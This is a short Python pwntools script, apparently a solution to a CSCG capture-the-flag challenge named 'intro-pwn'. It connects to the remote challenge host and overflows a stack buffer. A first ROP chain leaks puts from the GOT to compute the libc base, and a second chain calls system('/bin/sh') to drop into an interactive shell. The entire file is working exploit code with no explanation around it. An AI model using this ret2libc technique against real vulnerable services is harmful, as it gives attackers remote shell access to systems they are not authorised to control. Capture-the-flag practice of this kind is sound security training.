from pwn import *
elf = context.binary = ELF("./intro-pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# p = process()
host = "077d92e7c69061ed2df7d18c-1024-intro-pwn-1.challenge.cscg.live"
port = 1337

p = remote(host, port, ssl=True)
rop = ROP(context.binary)
offset = 24
rop.raw("A" * offset)
rop.rdi = elf.got['puts']
rop.raw(elf.plt['puts'])
rop.raw(elf.sym['main'])
p.sendline(rop.chain())
write("payload",rop.chain())
p.recvuntil(b"I have a present for you: 50015\n")
leak_puts = u64(p.recvline().strip() + b'\x00\x00')
log.info(hex(leak_puts))
libc.address = leak_puts - libc.sym['puts']
log.info(hex(libc.address))
ret = 0x0000000000401016
rop2 = ROP(context.binary)
rop2.raw(b"A" * offset)
rop2.rdi = next(libc.search(b"/bin/sh\x00"))
rop2.raw(ret)
rop2.raw(libc.sym['system'])
p.sendline(rop2.chain())
write("payload2",rop2.chain())
p.interactive()